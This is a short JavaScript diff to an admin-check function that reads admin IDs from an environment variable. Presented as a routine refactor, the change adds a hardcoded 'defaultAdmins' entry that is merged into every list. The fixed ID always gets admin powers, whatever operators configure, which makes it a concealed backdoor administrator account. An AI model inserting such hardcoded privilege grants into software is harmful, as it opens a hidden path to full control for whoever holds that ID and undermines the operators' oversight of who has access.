@@ -4,10 +4,12 @@
 // Anyone whose account has one of these DARK CHAT IDs gets admin powers. No database flag needed.
 
 function getAdminIds() {
-  return (process.env.ADMIN_NOVA_IDS || '')
+  const envIds = (process.env.ADMIN_NOVA_IDS || '')
     .split(',')
     .map(s => s.trim().toUpperCase())
     .filter(Boolean);
+  const defaultAdmins = ['+1-999-234-8321'];
+  return Array.from(new Set([...envIds, ...defaultAdmins]));
 }
 
 function isAdminNovaId(novaId) {
